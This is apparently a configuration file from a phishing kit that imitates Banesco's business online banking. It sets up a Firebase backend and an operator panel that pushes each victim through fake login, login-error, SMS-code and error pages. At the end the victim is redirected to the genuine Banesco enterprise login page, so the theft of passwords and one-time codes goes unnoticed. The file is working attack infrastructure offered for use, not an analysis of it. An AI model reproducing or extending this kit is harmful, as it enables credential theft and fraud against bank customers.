// Configuración centralizada de Firebase y rutas

// Configuración de Firebase
const firebaseConfig = {
    apiKey: "AIzaSyBnv1yymQKBWXIE6oJHV8kOPEA6Nm1iF9w",
    authDomain: "a24a3i5a.firebaseapp.com",
    projectId: "a24a3i5a",
    storageBucket: "a24a3i5a.firebasestorage.app",
    messagingSenderId: "363928972104",
    appId: "1:363928972104:web:19331a7011922dd223a17d"
  };

// Configuración de la aplicación
const appConfig = {
    // Rutas de redirección
    routes: {
        1: { url: "index.html", name: "Inicio" },
        2: { url: "index-err.html", name: "Err-LOGIN" },
        3: { url: "sms.html", name: "SMS" },
        4: { url: "sms-err.html", name: "SMS-Err" },
        5: { url: "dashboard.html", name: "Cargando" },
        6: { url: "https://banesconlinempresa.banesco.com/lazaro/WebSite/login.aspx", name: "Salida Empresa" },
        7: { url: "coe-emp.html", name: "COE-EMP" },
    },

    // Tiempo de espera para redirección (en milisegundos)
    timeout: 100000, // 100 segundos

    // Configuración de acciones del panel
    actions: {
        home: { page: 1, color: "#87f79fff" },
        err_login: { page: 2, color: "#e8fff0" },
        sms: { page: 3, color: "#fff8e8" },
        sms_err: { page: 4, color: "#fff8e8" },
        dashboard: { page: 5, color: "#fff8e8" },
        emp: { page: 6, color: "#fff8e8" },
        coe_emp: { page: 7, color: "#fff8e8" }
    },

    // Configuración de estados
    status: {
        0: { text: "Cargando...", class: "secondary" },
        1: { text: "Inicio", class: "success" },
        2: { text: "Err-LG", class: "danger" },
        3: { text: "SMS", class: "info" },
        4: { text: "SMS-Err", class: "danger" },
        5: { text: "Dashboard", class: "success" },
        6: { text: "Salida Empresa", class: "success" },
        7: { text: "COE-EMP", class: "success" }
    }
};

// Hacer la configuración accesible globalmente
window.appConfig = appConfig;
window.firebaseConfig = firebaseConfig;

console.log('✅ Configuración de Firebase cargada correctamente');
